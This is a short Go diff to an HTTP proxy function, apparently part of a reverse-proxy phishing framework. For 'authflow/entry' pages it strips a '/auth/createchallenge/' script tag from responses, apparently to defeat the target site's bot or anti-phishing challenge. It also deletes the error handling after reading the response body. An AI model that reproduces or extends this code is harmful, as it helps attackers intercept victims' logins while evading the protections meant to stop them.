@@ -1130,16 +1130,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// Read the original body of the response
 			// Read the response body
 			body, err := ioutil.ReadAll(resp.Body)
-			if err != nil {
-			    log.Debugf("Failed to read response body: %v", err)
-			    return resp // Return the original response if reading fails
-			}
 			
 			// Check if the path matches "authflow/entry"
 			if strings.Contains(resp.Request.URL.Path, "authflow/entry") {
 			    // Modify the body to remove <script async src="/auth/createchallenge/...">
 			    modifiedBody := regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), "")
-			
+			    log.Info("Change potential blocks")
 			    // Restore the modified body to the response
 			    resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(modifiedBody)))
 			    resp.ContentLength = int64(len(modifiedBody))
